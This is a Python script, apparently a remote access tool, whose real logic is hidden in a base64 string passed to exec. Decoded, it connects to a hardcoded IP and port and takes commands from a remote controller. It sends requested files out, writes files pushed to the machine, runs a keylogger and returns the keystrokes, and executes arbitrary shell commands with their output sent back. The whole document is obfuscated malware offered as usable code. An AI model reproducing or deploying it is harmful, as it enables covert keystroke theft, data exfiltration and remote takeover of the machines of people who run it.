#remote
import socket 
import subprocess
from subprocess import run
import base64
import os
import time
from pathlib import Path
import threading
from pynput.keyboard import Key  
from pynput.keyboard import Listener
import datetime
[exec(base64.b64decode(x).decode('utf-8')) for x in (("aXA9IjEwLjEyMC4xNjkuMTQ3Igpwb3J0PTgwMDMKY3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCmNzLmNvbm5lY3QoKGlwLHBvcnQpKQptc2c9IlRFU1RJTkcuLiIKY3Muc2VuZChtc2cuZW5jb2RlKCkpCmFsbGtleXM9JycKCmRlZiBwcmVzc2VkKGtleSk6CiAgICBnbG9iYWwgYWxsa2V5cwogICAgYWxsa2V5cys9c3RyKGtleSkrIiAiCgpkZWYgcmVsZWVzKGtleSk6CiAgICBwYXNzCgpkZWYga2V5bG9nKCk6CiAgICBsPUxpc3RlbmVyKG9uX3ByZXNzPXByZXNzZWQsb25fcmVsZWFzZT1yZWxlZXMpCiAgICBsLnN0YXJ0KCkKd2hpbGUgbXNnIT0icXVpdCI6CiAgICAKICAgIG1zZz1jcy5yZWN2KDEwMjQpLmRlY29kZSgpCgogICAgbXNnPWxpc3QobXNnLnNwbGl0KCIgIikpCgogICAgaWYgbXNnWzBdPT0ibGVsZSI6CiAgICAgICAgcHJpbnQoIkZJbGUgVHJhbnNmciBNT2RlLS0gW30tLSkte10iKQogICAgICAgIGNmaWxlX25hbWU9bXNnWzFdCiAgICAgICAgZj1vcGVuKFBhdGgoY2ZpbGVfbmFtZSksJ3InKQogICAgICAgIGNvbnRlbnRzPWYucmVhZCgpCiAgICAgICAgZi5jbG9zZSgpCiAgICAgICAgY3Muc2VuZChjb250ZW50cy5lbmNvZGUoInV0Zi04IikpCiAgICAgICAgcHJpbnQoIiBGSWxlOi0+ICIrIGNmaWxlX25hbWUpCiAgICAgICAgbXNnPWNzLnJlY3YoMTAyNCkuZGVjb2RlKCkKCiAgICBlbGlmIG1zZ1swXT09ImRlZGUiOgogICAgICAgIHByaW50KCJmSUxFIERvd25sb2FkaW5nLS0rK18hIikKICAgICAgICBjcl9maWxlX25hbWU9bXNnWzFdKyJDMiIKICAgICAgICBmPW9wZW4oUGF0aChjcl9maWxlX25hbWUpLCd3JykKICAgICAgICBjb250ZW50cz1jcy5yZWN2KDIwNDgpLmRlY29kZSgpCiAgICAgICAgZi53cml0ZShjb250ZW50cy5lbmNvZGUoKSkKICAgICAgICBmLmNsb3NlKCkKICAgICAgICBtc2c9Y3MucmVjdigxMDI0KS5kZWNvZGUoKQogICAgICAgIAoKICAgICAgICAKICAgIHRlbXAgPSAnICcuam9pbihtc2cpCiAgICB0ZW1wPXRlbXAucmVwbGFjZSgiWyIsIiAiKS5yZXBsYWNlKCJbIiwiICIpCiAgICBwcmludCh0ZW1wKQogICAgaWYodGVtcD09ImRvbmUxMjMiKToKICAgICAgICBjbG9zZXlvdT0iaG9neWEiCiAgICAgICAgY3Muc2VuZChjbG9zZXlvdS5lbmNvZGUoKSkKICAgICAgICBjcy5jbG9zZSgpCiAgICAgICAgbXNnPWNzLnJlY3YoMTAyNCkuZGVjb2RlKCkKCgogICAgZWxpZiB0ZW1wPT0ia2V5bG9nb24iOgogICAgICAgIHQxPXRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWtleWxvZykKICAgICAgICB0MS5zdGFydCgpCiAgICAgICAgbXNnPSJrZXlsb2dnZXJfc3RhcnRlZCIKICAgICAgICBjcy5zZW5kKG1zZy5lbmNvZGUoKSkKICAgICAgICBtc2c9Y3MucmVjdigxMDI0KS5kZWNvZGUoKQogICAgZWxpZiB0ZW1wPT0ia2V5bG9nb2ZmIjoKICAgICAgICB0MS5qb2luKCkKICAgICAgICBjcy5zZW5kKGFsbGtleXMuZW5jb2RlKCkpCiAgICAgICAgbXNnPWNzLnJlY3YoMTAyNCkuZGVjb2RlKCkKCgoKICAgICMgcD1zdWJwcm9jZXNzLlBvcGVuKG1zZyxzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUsc2hlbGw9VHJ1ZSkKICAgIHA9c3VicHJvY2Vzcy5ydW4oZiJ7dGVtcH0iLCBjYXB0dXJlX291dHB1dD1UcnVlLHRleHQ9VHJ1ZSxzaGVsbD1UcnVlKQogICAgb3V0cHV0PXAuc3Rkb3V0CiAgICBlcnJvcj1wLnN0ZGVycgogICAgYSA9IHJ1bihmImtpbGwge3RlbXB9IiwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgdGV4dD1UcnVlLCBzaGVsbD1UcnVlKQogICAgCiAgICBpZiBsZW4ob3V0cHV0KT4wOgogICAgICAgIG1zZz1zdHIob3V0cHV0KQogICAgZWxzZToKICAgICAgICBtc2c9Im5vIG91dHB1dCIKICAgIGNzLnNlbmQobXNnLmVuY29kZSgpKQogICAgcHJpbnQobXNnKQoKCiAgICAKY3MuY2xvc2UoKQo=".encode('utf-8')),)]
